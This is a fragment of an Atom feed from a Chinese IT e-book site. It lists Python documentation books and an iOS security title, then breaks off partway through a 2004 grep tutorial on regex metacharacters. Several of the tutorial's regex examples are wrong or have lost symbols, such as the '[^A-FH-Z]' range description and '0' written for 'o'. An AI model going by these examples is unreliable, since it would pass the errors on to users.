      &lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://github.com/wufawei&quot;&gt;wufawei&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/wufawei/iossecurity&quot;&gt;iossecurity&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ios" scheme="http://it-ebooks.flygon.net/tags/ios/"/>
    
      <category term="逆向" scheme="http://it-ebooks.flygon.net/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Flask 扩展文档汇总</title>
    <link href="http://it-ebooks.flygon.net/flask-extension-docs/"/>
    <id>http://it-ebooks.flygon.net/flask-extension-docs/</id>
    <published>2016-03-12T03:15:17.000Z</published>
    <updated>2016-03-12T03:16:48.887Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/flask-extension-docs.jpg?build=1451704333665&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;http://www.pythondoc.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Python中文学习大本营&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/book/wizardforcel/flask-extension-docs/details&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/pdf/book/wizardforcel/flask-extension-docs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/epub/book/wizardforcel/flask-extension-docs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;EPUB格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/mobi/book/wizardforcel/flask-extension-docs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MOBI格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/flask-extension-docs.jpg?build=1451704333665&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;http://www.pythondoc.com/&quot;&gt;Python中文学习大本营&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="flask" scheme="http://it-ebooks.flygon.net/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>SQLAlchemy 中文文档（未完成）</title>
    <link href="http://it-ebooks.flygon.net/sqlalchemy-docs-cn/"/>
    <id>http://it-ebooks.flygon.net/sqlalchemy-docs-cn/</id>
    <published>2016-03-11T03:54:24.000Z</published>
    <updated>2016-03-11T03:55:16.883Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/sqlalchemy.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/sqlalchemy-docs-cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sqlalchemy-docs-cn&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/sixu05202004/sqlalchemy-docs-cn/archive/master.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RST格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/sqlalchemy.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/sqlalchemy-docs-cn&quot;&gt;sqlalchemy-docs-cn&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="sqlalchemy" scheme="http://it-ebooks.flygon.net/tags/sqlalchemy/"/>
    
  </entry>
  
  <entry>
    <title>Sphinx 中文文档</title>
    <link href="http://it-ebooks.flygon.net/sphinx-docs-cn/"/>
    <id>http://it-ebooks.flygon.net/sphinx-docs-cn/</id>
    <published>2016-03-11T03:52:37.000Z</published>
    <updated>2016-03-11T03:53:42.194Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/sphinx.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/sphinx-docs-cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sphinx-docs-cn&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.pythondoc.com/sphinx/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/sixu05202004/sphinx-docs-cn/archive/master.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RST格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/sphinx.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/sphinx-docs-cn&quot;&gt;sphinx-docs-cn&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="sphinx" scheme="http://it-ebooks.flygon.net/tags/sphinx/"/>
    
  </entry>
  
  <entry>
    <title>Flask 大型教程</title>
    <link href="http://it-ebooks.flygon.net/flask-mega-tutorial/"/>
    <id>http://it-ebooks.flygon.net/flask-mega-tutorial/</id>
    <published>2016-03-11T03:50:59.000Z</published>
    <updated>2016-03-11T03:51:59.996Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/flaskmega.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/The-Flask-Mega-Tutorial&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The-Flask-Mega-Tutorial&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.pythondoc.com/flask-mega-tutorial/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/sixu05202004/The-Flask-Mega-Tutorial/archive/master.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RST格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/flaskmega.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/The-Flask-Mega-Tutorial&quot;&gt;The-Flask-Mega-Tutorial&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="flask" scheme="http://it-ebooks.flygon.net/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Explore Flask 中文版</title>
    <link href="http://it-ebooks.flygon.net/explore-flask-cn/"/>
    <id>http://it-ebooks.flygon.net/explore-flask-cn/</id>
    <published>2016-03-11T03:49:00.000Z</published>
    <updated>2016-03-11T03:50:21.528Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/exploreflask.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/explore-flask-cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;explore-flask-cn&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.pythondoc.com/exploreflask/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/sixu05202004/explore-flask-cn/archive/master.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RST格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.pythondoc.com/img/exploreflask.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/sixu05202004/explore-flask-cn&quot;&gt;explore-flask-cn&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="flask" scheme="http://it-ebooks.flygon.net/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Grep学习笔记</title>
    <link href="http://it-ebooks.flygon.net/grep-note/"/>
    <id>http://it-ebooks.flygon.net/grep-note/</id>
    <published>2016-03-11T03:08:37.000Z</published>
    <updated>2016-03-13T03:42:42.968Z</updated>
    
    <content type="html">&lt;p&gt;整理：Jims of &lt;a href=&quot;http://www.ringkee.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;肥肥世家&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;mailto:jims.yang@gmail.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;jims.yang@gmail.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Copyright © 2004 本文遵从GPL协议，欢迎转载、修改、散布。&lt;/p&gt;
&lt;p&gt;发布时间：2004年7月16日&lt;/p&gt;
&lt;p&gt;更新时间：2005年8月24日&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#id2875182&quot;&gt;1. grep简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2811728&quot;&gt;2. grep正则表达式元字符集（基本集）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810259&quot;&gt;3. 用于egrep和 grep -E的元字符扩展集&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810362&quot;&gt;4. POSIX字符类&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2810577&quot;&gt;5. Grep命令选项&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861634&quot;&gt;6. 实例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#id2861748&quot;&gt;7. 技巧&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1-grep简介&quot;&gt;&lt;a href=&quot;#1-grep简介&quot; class=&quot;headerlink&quot; title=&quot;1. grep简介&quot;&gt;&lt;/a&gt;1. grep简介&lt;/h2&gt;&lt;p&gt;grep（global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。Unix的grep家族包括grep、egrep和fgrep。egrep和fgrep的命令只跟grep有很小不同。egrep是grep的扩展，支持更多的re元字符，fgrep就是fixed grep或fast grep，它们把所有的字母都看作单词，也就是说，正则表达式中的元字符表示回其自身的字面意义，不再特殊。linux使用GNU版本的grep。它功能更强，可以通过-G、-E、-F命令行选项来使用egrep和fgrep的功能。&lt;/p&gt;
&lt;p&gt;grep的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到屏幕，不影响原文件内容。&lt;/p&gt;
&lt;p&gt;grep可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回0，如果搜索不成功，则返回1，如果搜索的文件不存在，则返回2。我们利用这些返回值就可进行一些自动化的文本处理工作。&lt;/p&gt;
&lt;h2 id=&quot;2-grep正则表达式元字符集（基本集）&quot;&gt;&lt;a href=&quot;#2-grep正则表达式元字符集（基本集）&quot; class=&quot;headerlink&quot; title=&quot;2. grep正则表达式元字符集（基本集）&quot;&gt;&lt;/a&gt;2. grep正则表达式元字符集（基本集）&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;^&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;锚定行的开始 如：&amp;apos;^grep&amp;apos;匹配所有以grep开头的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;锚定行的结束 如：&amp;apos;grep$&amp;apos;匹配所有以grep结尾的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配一个非换行符的字符 如：&amp;apos;gr.p&amp;apos;匹配gr后接一个任意字符，然后是p。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配零个或多个先前字符 如：&amp;apos;*grep&amp;apos;匹配所有一个或多个空格后紧跟grep的行。 .*一起用代表任意字符。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配一个指定范围内的字符，如&amp;apos;[Gg]rep&amp;apos;匹配Grep和grep。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[^]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配一个不在指定范围内的字符，如：&amp;apos;[^A-FH-Z]rep&amp;apos;匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\(..\)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;标记匹配字符，如&amp;apos;\(love\)&amp;apos;，love被标记为1。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;锚定单词的开始，如:&amp;apos;\&amp;amp;lt;grep&amp;apos;匹配包含以grep开头的单词的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;锚定单词的结束，如&amp;apos;grep\&amp;amp;gt;&amp;apos;匹配包含以grep结尾的单词的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;x\&amp;#123;m\&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;重复字符x，m次，如：&amp;apos;0\&amp;#123;5\&amp;#125;&amp;apos;匹配包含5个o的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;x\&amp;#123;m,\&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;重复字符x,至少m次，如：&amp;apos;o\&amp;#123;5,\&amp;#125;&amp;apos;匹配至少有5个o的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;x\&amp;#123;m,n\&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;重复字符x，至少m次，不多于n次，如：&amp;apos;o\&amp;#123;5,10\&amp;#125;&amp;apos;匹配5--10个o的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\w&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配文字和数字字符，也就是[A-Za-z0-9]，如：&amp;apos;G\w*p&amp;apos;匹配以G后跟零个或多个文字或数字字符，然后是p。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\W&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\w的反置形式，匹配一个或多个非单词字符，如点号句号等。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;单词锁定符，如: &amp;apos;\bgrep\b&amp;apos;只匹配grep。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;3-用于egrep和-grep-E的元字符扩展集&quot;&gt;&lt;a href=&quot;#3-用于egrep和-grep-E的元字符扩展集&quot; class=&quot;headerlink&quot; title=&quot;3. 用于egrep和 grep -E的元字符扩展集&quot;&gt;&lt;/a&gt;3. 用于egrep和 grep -E的元字符扩展集&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配一个或多个先前的字符。如：&amp;apos;[a-z]+able&amp;apos;，匹配一个或多个小写字母后跟able的串，如loveable,enable,disable等。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;匹配零个或多个先前的字符。如：&amp;apos;gr p&amp;apos;匹配gr后跟一个或没有字符，然后是p的行。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a|b|c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 